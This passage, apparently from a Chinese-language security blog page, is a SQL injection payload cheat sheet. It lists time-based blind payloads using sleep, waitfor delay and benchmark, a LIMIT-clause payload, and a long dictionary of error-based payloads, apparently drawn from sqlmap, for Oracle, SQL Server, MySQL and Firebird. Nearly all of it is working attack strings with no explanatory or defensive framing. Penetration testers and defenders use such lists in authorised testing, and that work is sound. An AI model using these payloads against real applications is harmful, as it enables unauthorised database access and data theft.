<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<h4 id="1-3-时间注入payload"><a href="#1-3-时间注入payload" class="headerlink" title="1.3 时间注入payload"></a>1.3 时间注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">'%2b(if((1=1 and sleep(4)),1,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)))%<span class="number">2</span>b<span class="string">'a</span></span><br><span class="line"><span class="string">-IF((1=1),sleep(4),(SELECT 1 UNION SELECT 2))-- -</span></span><br><span class="line"><span class="string">'</span>;(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)<span class="comment">-- -</span></span><br><span class="line">;<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)</span><br><span class="line">);<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)<span class="comment">-- -</span></span><br><span class="line">;<span class="keyword">SELECT</span> <span class="keyword">sleep</span>(<span class="number">4</span>)<span class="comment">-- -</span></span><br><span class="line">;(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)<span class="comment">-- -</span></span><br><span class="line"><span class="string">' AND SLEEP(4)%23</span></span><br><span class="line"><span class="string">AND sleep(4)</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">AND</span> <span class="keyword">sleep</span>(<span class="number">4</span>) <span class="keyword">AND</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">'</span>) <span class="keyword">AND</span> <span class="keyword">sleep</span>(<span class="number">4</span>) <span class="keyword">AND</span> (<span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">) AND sleep(4) AND (1=1</span></span><br><span class="line"><span class="string">" AND sleep(4) AND "1"="</span></span><br><span class="line"><span class="string">'</span>) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x)<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x)</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">' and (select(0)from(select(sleep(4)))x) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line"><span class="string">" and (select(0)from(select(sleep(4)))x) and "</span><span class="number">1</span><span class="string">"="</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">') and (select(0)from(select(sleep(4)))x) and ('</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line"><span class="keyword">rlike</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">' rlike (select(0)from(select(sleep(4)))x) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">rlike</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="string">') rlike (select(0)from(select(sleep(4)))x) and ('</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">;waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">';waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">);waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">');waitfor delay '0:0:4' <span class="comment">-- -</span></span><br><span class="line">if(now()=sysdate(),sleep(4),0)<span class="comment">/*'XOR(if(now()=sysdate(),sleep(4),0))OR'"XOR(if(now()=sysdate(),sleep(4),0))OR"*/</span></span><br><span class="line">(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(<span class="keyword">sleep</span>(<span class="number">4</span>)))lWuP)</span><br></pre></td></tr></table></figure>

<h4 id="1-4-LIMIT-注入payload"><a href="#1-4-LIMIT-注入payload" class="headerlink" title="1.4 LIMIT 注入payload"></a>1.4 <strong>LIMIT</strong> 注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procedure analyse(extractvalue(1,if(1=1,benchmark(5000000,md5(1)),2)),1)</span><br></pre></td></tr></table></figure>

<h3 id="二、Sqlmap中注入payload"><a href="#二、Sqlmap中注入payload" class="headerlink" title="二、Sqlmap中注入payload"></a>二、Sqlmap中注入payload</h3><h4 id="2-1-错误注入payload"><a href="#2-1-错误注入payload" class="headerlink" title="2.1 错误注入payload"></a>2.1 错误注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">error_base_injection = &#123;</span><br><span class="line">    'INJPAY_27':</span><br><span class="line">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span><br><span class="line">         'payload': " AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_26':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_25':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_24':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_23':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_22':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_21':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_20':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_50':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_29':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH((<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_28':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_51':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1])<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_38':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (UPDATEXML([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'.'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>),[RANDNUM1]))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_39':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_55':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">WHERE</span> [RANDNUM]=<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_30':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH((<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_31':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_32':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_33':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">PROCEDURE</span> ANALYSE(EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>)),<span class="number">1</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_34':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_35':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_36':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_37':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_12':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> <span class="keyword">ROW</span>([RANDNUM],[RANDNUM1])&gt;(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> [RANDNUM2] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM3] 